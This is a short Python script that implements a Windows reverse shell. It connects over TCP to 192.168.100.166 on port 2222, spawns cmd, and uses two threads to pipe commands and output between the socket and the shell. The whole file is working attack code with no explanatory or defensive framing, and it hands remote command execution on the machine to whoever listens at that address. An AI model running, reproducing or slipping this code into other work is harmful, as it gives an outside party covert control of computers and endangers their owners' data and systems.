import os, socket, subprocess, threading, time
from sys import platform
def s2p():
    global s, p
    while True:
        try:
            data = s.recv(1024)
            if len(data) > 0:
                p.stdin.write(data)
                p.stdin.flush()
        except:
            continue

def p2s():
    global s, p
    while True:
        try:
            s.send(p.stdout.read(1))
        except:
            continue
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.100.166", 2222))
p = subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
s2p_thread=threading.Thread(target=s2p)
p2s_thread=threading.Thread(target=p2s)
s2p_thread.start()
p2s_thread.start()
